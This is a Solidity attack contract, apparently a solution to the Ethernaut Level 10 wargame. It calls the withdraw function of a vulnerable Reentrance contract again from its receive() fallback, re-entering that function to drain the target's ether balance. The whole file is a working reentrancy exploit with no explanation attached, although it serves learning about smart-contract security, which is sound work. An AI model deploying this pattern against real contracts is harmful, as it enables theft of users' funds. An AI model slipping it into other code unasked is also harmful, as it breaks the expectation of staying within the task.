// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

/**
 * @notice Inteface relating to the Reentrance contract found in Ethernaut Level 10
 * @notice Full contract can be found in the ethernaut directory of this repo 
 */
interface IReentrance {
    function donate(address _to) external payable;

    function balanceOf(address _who) external view returns (uint balance);

    function withdraw(uint _amount) external;
}

contract HackReentrance {

    IReentrance private _reentrance;
    
    constructor(address payable reentranceAddress) public {
        _reentrance = IReentrance(reentranceAddress);
    }

    function contribute() external payable {
        (bool success, ) = address(_reentrance).call{value: msg.value}(
            abi.encodeWithSignature("donate(address)", address(this))
        );  
        require(success, "HackReentrance: failed to contribute to reentrance");
    }

    function _withdrawBalance() public {
        uint balance = _reentrance.balanceOf(address(this));
        _reentrance.withdraw(balance);
    }

    function beginAttack() external {
        _withdrawBalance();  
    }

    receive() external payable {
        _withdrawBalance();   
    }
    
}